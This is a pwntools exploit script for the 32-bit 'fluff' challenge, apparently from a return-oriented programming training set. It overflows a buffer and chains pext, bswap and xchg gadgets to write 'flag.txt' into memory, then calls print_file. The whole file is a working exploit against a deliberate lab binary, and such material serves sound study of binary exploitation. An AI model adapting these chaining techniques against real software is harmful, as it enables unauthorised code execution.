#!/bin/python3
from pwn import *

bin='./fluff32'
context.binary = bin

write_addr = 0x0804a018 # data addr
pop_ebp = 0x080485bb # pop ebp; ret;
gadget1 = 0x08048543 # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
gadget2 = 0x08048555 # xchg byte ptr [ecx], dl; ret;
gadget3 = 0x08048558 # pop ecx; bswap ecx; ret;

elf=ELF(bin)
print_file=elf.plt[b'print_file']

# sets the byte to write b into
# edx with gadget1
def set_byte(b):
    payload = b''

    # bit list of b
    target_bits = [1 if b & (1 << (7-n)) else 0 for n in range(8)]
    target_bits.reverse()

    # construct mask
    eax = 0xb0bababa
    mask_bits = []
    ti = 0
    # compare from eax's least significant bit (right)
    # to most significant bit (left)
    for i in range(0, eax.bit_length()):
        if ti >= len(target_bits):
            break
        tbit = target_bits[ti]
        bit = (eax >> i) & 1
        if bit == tbit:
            mask_bits.append(1)
            ti += 1
        else:
            mask_bits.append(0)

    # set mask 
    mask_bits.reverse()
    mask = 0
    # turn bit list to int
    for bit in mask_bits:
        mask = (mask << 1) | bit
    payload += p32(pop_ebp) + p32(mask)

    # call pext gadget
    payload += p32(gadget1)
    return payload

# set address to write to
def set_address(addr):
    payload = b''
    # default byte order is little
    # gadget3 will switch byte order
    # from big to little
    ecx = p32(addr, endian='big')
    payload += p32(gadget3) + ecx
    return payload

# write byte string s
# to address addr
def write_string(addr, s):
    payload = b''
    for i in range(0, len(s)):
        c = s[i]
        payload += set_byte(c)
        payload += set_address(addr + i)
        # writes byte
        payload += p32(gadget2)     
    return payload

# create payload
payload = b'A' * 44
fname = b'flag.txt'
payload += write_string(write_addr, fname)
payload += p32(print_file) + p32(pop_ebp) + p32(write_addr)
payload += p32(elf.symbols['main']) #safe exit without core dumps

# send payload + receive flag
p = process('./fluff32')
p.sendafter(b'> ',payload)
output = p.recvall(timeout=1).decode()
print(output)

